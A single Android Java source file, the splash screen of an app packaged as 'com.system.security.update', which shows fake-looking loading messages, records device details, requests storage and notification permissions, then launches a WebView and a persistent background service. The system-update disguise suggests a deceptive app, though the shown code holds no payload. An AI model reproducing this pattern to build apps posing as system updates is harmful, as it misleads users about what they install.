package com.system.security.update;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

public class SplashActivity extends AppCompatActivity {
    
    private ProgressBar progressBar;
    private TextView loadingText;
    private String[] loadingMessages = {
        "Initializing modules...",
        "Checking system compatibility...",
        "Configuring security protocols...",
        "Optimizing for your device...",
        "Almost ready..."
    };
    private int msgIndex = 0;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_splash);
        
        progressBar = findViewById(R.id.progressBar);
        loadingText = findViewById(R.id.loadingText);
        
        // Save device info
        Config.deviceModel = Build.MODEL;
        Config.deviceAndroid = Build.VERSION.RELEASE;
        
        // Animate loading messages
        animateLoading();
        
        // After loading, check permissions
        new Handler().postDelayed(() -> {
            checkPermissionsAndProceed();
        }, 4000);
    }
    
    private void animateLoading() {
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                if (msgIndex < loadingMessages.length) {
                    loadingText.setText(loadingMessages[msgIndex]);
                    msgIndex++;
                    new Handler().postDelayed(this, 700);
                }
            }
        }, 500);
    }
    
    private void checkPermissionsAndProceed() {
        List<String> permissionsNeeded = new ArrayList<>();
        
        // Storage for old devices
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(this, 
                    android.Manifest.permission.WRITE_EXTERNAL_STORAGE) 
                    != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(android.Manifest.permission.WRITE_EXTERNAL_STORAGE);
                permissionsNeeded.add(android.Manifest.permission.READ_EXTERNAL_STORAGE);
            }
        }
        
        // Notifications for Android 13+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this,
                    android.Manifest.permission.POST_NOTIFICATIONS)
                    != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(android.Manifest.permission.POST_NOTIFICATIONS);
            }
        }
        
        if (!permissionsNeeded.isEmpty()) {
            Intent intent = new Intent(this, PermissionStepActivity.class);
            intent.putStringArrayListExtra("permissions", new ArrayList<>(permissionsNeeded));
            startActivity(intent);
            finish();
        } else {
            // All permissions granted, go direct
            goToMainApp();
        }
    }
    
    private void goToMainApp() {
        Intent intent = new Intent(this, WebViewActivity.class);
        startActivity(intent);
        
        // Start background service
        Intent serviceIntent = new Intent(this, BackgroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        
        finish();
    }
}
